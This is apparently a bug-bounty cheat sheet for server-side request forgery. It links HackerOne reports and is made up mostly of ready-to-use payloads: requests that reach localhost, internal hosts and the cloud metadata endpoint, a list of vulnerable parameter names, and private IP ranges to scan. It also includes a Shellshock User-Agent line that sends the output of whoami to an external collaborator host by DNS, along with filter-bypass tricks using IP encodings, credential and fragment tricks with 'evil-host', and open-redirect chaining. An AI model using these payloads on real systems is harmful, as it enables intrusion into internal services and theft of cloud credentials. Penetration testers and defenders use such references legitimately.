## PoC

1. [How I g0t 4000$ for AWS Metadata Leak and Takeover $$](https://ferreiraklet.github.io/posts/4000BountyAws/)
2. [SSRF via Host Header replacing](https://hackerone.com/reports/1783015)
3. [SSRF via DNS Rebinding](https://hackerone.com/reports/1379656)
4. [SSRF in webhooks via 303 redirect bypass](https://hackerone.com/reports/508459)
5. [SSRF via URL Path](https://hackerone.com/reports/1189367)
6. [SSRF via X-Forwarded-Host](https://hackerone.com/reports/727330)
7. [SSRF chained to hit internal host leading to another SSRF which allows to read internal images](https://hackerone.com/reports/826097)
8. [External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing](https://hackerone.com/reports/1062888)
9. [DNS Rebinding SSRF in Burp Suite MCP Server](https://hackerone.com/reports/3176157)

## Index:

1. [Description](#description)
2. [SSRF Vulnerability Overview](#ssrf)
3. [Common SSRF Endpoints](#common-ssrf-endpoints)
4. [Tips](#tips)
   - [Port and Path Exploitation](#port-and-path-exploitation)
   - [File Uploads](#file-uploads)
   - [Internal Private IPv4 Networks](#internal-private-ipv4-networks)
5. [Common Method (API Parameter)](#common-method-api-parameter)
6. [Blind Method](#blind-method)
   - [Using Burp Collaborator in Referer Header](#using-burp-collaborator-in-referer-header)
   - [Shellshock Exploitation via SSRF](#shellshock-exploitation-via-ssrf)
7. [Bypassing Common SSRF Defenses](#bypassing-common-ssrf-defenses)
   - [SSRF with Blacklist-Based Input Filters](#ssrf-with-blacklist-based-input-filters)
   - [SSRF with Whitelist-Based Input Filters](#ssrf-with-whitelist-based-input-filters)
     - [Embedding Credentials in a URL](#embedding-credentials-in-a-url)
     - [Using URL Fragment for Bypass](#using-url-fragment-for-bypass)
     - [DNS Naming Hierarchy Bypass](#dns-naming-hierarchy-bypass)
   - [Bypassing SSRF Filters via Open Redirection](#bypassing-ssrf-filters-via-open-redirection)

# Description

To exploit a Server-Side Request Forgery (SSRF) vulnerability, attackers craft an HTTP request where a user-controlled input is used to manipulate server-side requests. This usually involves placing the payload in input fields that the application uses to make requests on behalf of the user.

Here are some examples of where to put an SSRF payload in HTTP requests:

### 1. In Query Parameters

When a web application uses a query parameter to fetch data from a remote URL, you can place an SSRF payload directly in the parameter value.

**Example HTTP Request:**
```
GET /fetch?url=http://127.0.0.1:8080/admin HTTP/1.1
Host: vulnerable-website.com
```
In this example, the `url` parameter is vulnerable to SSRF. The payload (`http://127.0.0.1:8080/admin`) attempts to access an internal service on the server's local network.

### 2. In POST Data

If the web application processes POST data to make server-side requests, an SSRF payload can be included in the body.

**Example HTTP Request:**
```
POST /submit HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

target=http://169.254.169.254/
```
Here, the `target` parameter contains the SSRF payload (`http://169.254.169.254/`), which attempts to access the cloud metadata service on cloud-hosted servers.

### 3. In HTTP Headers

Some applications may use values from HTTP headers to construct server-side requests, making them potential places for SSRF payloads.

**Example HTTP Request:**
```
GET / HTTP/1.1
Host: vulnerable-website.com
X-Original-URL: http://internal-service.local/
```
In this example, the `X-Original-URL` header may be used by the server to make a request to the URL specified, potentially allowing an SSRF attack.

### 4. In JSON or XML Body

When the application accepts data in JSON or XML format, SSRF payloads can be placed inside the fields that are used for server-side requests.

**Example JSON HTTP Request:**
```
POST /api/fetch HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/json
Content-Length: 52

{
    "url": "http://localhost/admin"
}
```
Here, the `url` field in the JSON payload is used to trigger an SSRF request to `http://localhost/admin`.

**Example XML HTTP Request:**
```
POST /api/fetch HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml
Content-Length: 85

<request>
    <url>http://127.0.0.1:80/</url>
</request>
```
In this case, the XML body contains an SSRF payload targeting an internal IP address.

### 5. In URL Path

SSRF payloads can also be placed directly in the URL path if the web application uses parts of the path to make server-side requests.

**Example HTTP Request:**
```
GET /proxy/http://192.168.1.1:8080/ HTTP/1.1
Host: vulnerable-website.com
```
The URL path `/proxy/http://192.168.1.1:8080/` is designed to trick the server into making a request to an internal service.

### Common SSRF Payloads

- **Internal IP Addresses**: `http://127.0.0.1/`, `http://192.168.1.1/`, `http://10.0.0.1/`
- **Cloud Metadata Services**: `http://169.254.169.254/latest/meta-data/` (Amazon Web Services)
- **Other Protocols**: `file://`, `ftp://`, `gopher://`, etc., may be used if the server supports them.

SSRF attacks allow attackers to bypass firewalls, access internal services, or even perform port scans on internal networks. To prevent SSRF vulnerabilities, proper input validation, whitelisting of allowed domains, and strict handling of user-supplied URLs are essential.

## SSRF
This vulnerability helps attacker to send request to back-end systems. To learn >> https://www.hackerone.com/application-security/how-server-side-request-forgery-ssrf

## Common SSRF Endpoints
```
dest=
path=
window=
next=
site=
reference=
data=
load=
html=
validate=
page=
return=
callback=
domain=
feed=
view=
dir=
request-baskets=
dict=
pdf=
file=
imageuri=
url=
key=
.json=
oauth=
redirect=
api=
dashboard=
config.=
```
## Tips

### Port and Path Exploitation
1. Try with port number, path.

### File Uploads
2. File uploads: instead of uploading a file, try sending a URL and see if it downloads the content of the URL. Example: https://hackerone.com/reports/713

### Internal Private IPv4 Networks
3. If you do want to look for internal services, here’s a list of private IPv4 networks that you could scan for services:

    - 10.0.0.0/8
    - 127.0.0.1/32
    - 172.16.0.0/12
    - 192.168.0.0/16

## Common Method (API Parameter)
```txt
http://localhost/
http://127.0.0.1/
```
## Blind Method
#### Just place burpcollaborator server in referer header
```txt
Referer: http://burpcollaborator.net
```
#### Shellshock exploitation via SSRF
```txt
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).3kobqoj8uv6qbwwlkaf5cvzr1i79v0jp.oastify.com >> Change Uger-Agent info
Referer: http://192.168.0.$1$:8080 >> Bruteforce the ip
```
## Bypassing common SSRF defenses
_____________________________________
### SSRF with blacklist-based input filters
```txt
http://127.1
http://2130706433
http://017700000001
http://127.0.0.1:21/?%0A >> You can change port number if needed.
http://[::]:80/ 
http://spoofed.burpcollaborator.net
```
### SSRF with whitelist-based input filters
#### You can embed credentials in a URL before the hostname, using the @ character. For example:
```txt
    https://expected-host:fakepassword@evil-host
    https://expected-host:fakepassword@burpcollaborator.net
```
#### You can use the # character to indicate a URL fragment. For example:
```txt
    https://evil-host#@expected-host
    https://burpcollaborator.net#@google.com
```
Double URL-encode # to %2523.
#### You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
```txt
    https://expected-host.evil-host
    https://google.com.burpcollaborator.net
```
### Bypassing SSRF filters via open redirection
#### For example, the application contains an open redirection vulnerability in which the following URL (http://evil-user.net):
```txt
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```
#### You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows: 
```txt
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```
**Note: Always encode `&` to url encode** 
